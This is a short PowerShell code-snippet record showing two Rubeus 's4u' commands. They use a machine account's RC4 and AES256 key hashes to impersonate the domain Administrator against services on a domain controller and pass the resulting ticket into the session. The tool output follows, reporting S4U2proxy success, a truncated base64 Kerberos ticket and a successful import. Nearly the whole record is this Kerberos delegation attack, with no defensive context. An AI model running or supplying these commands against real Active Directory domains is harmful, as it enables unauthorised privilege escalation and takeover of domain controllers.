---
id: b6ac2d32-b0a2-48e9-9775-56cb23fc909e
type: code
language: Powershell
verified: false
created_at: '2023-04-06T03:56:07.771922+00:00'
updated_at: '2023-04-06T03:56:07.771922+00:00'
---

# Code Snippet b6ac2d32

**Language**: Powershell

```powershell
.\Rubeus.exe s4u /user:swktest$ /rc4:F8E064CA98539B735600714A1F1907DD /impersonateuser:Administrator /msdsspn:cifs/dc01-ww2.factory.lan /ptt /altservice:cifs,http,host,rpcss,wsman,ldap
.\Rubeus.exe s4u /user:swktest$ /aes256:0129D24B2793DD66BAF3E979500D8B313444B4D3004DE676FA6AFEAC1AC5C347 /impersonateuser:Administrator /msdsspn:cifs/dc01-ww2.factory.lan /ptt /altservice:cifs,http,host,rpcss,wsman,ldap

[*] Impersonating user 'Administrator' to target SPN 'cifs/dc01-ww2.factory.lan'
[*] Using domain controller: DC01-WW2.factory.lan (172.16.42.5)
[*] Building S4U2proxy request for service: 'cifs/dc01-ww2.factory.lan'
[*] Sending S4U2proxy request
[+] S4U2proxy success!
[*] base64(ticket.kirbi) for SPN 'cifs/dc01-ww2.factory.lan':

    doIGXDCCBligAwIBBaEDAgEWooIFXDCCBVhhggVUMIIFUKADAgEFoQ0bC0ZBQ1RPUlkuTEFOoicwJaAD
    AgECoR4wHBsEY2lmcxsUZGMwMS[...]PMIIFC6ADAgESoQMCAQOiggT9BIIE
    LmZhY3RvcnkubGFu

[*] Action: Import Ticket
[+] Ticket successfully imported!
```


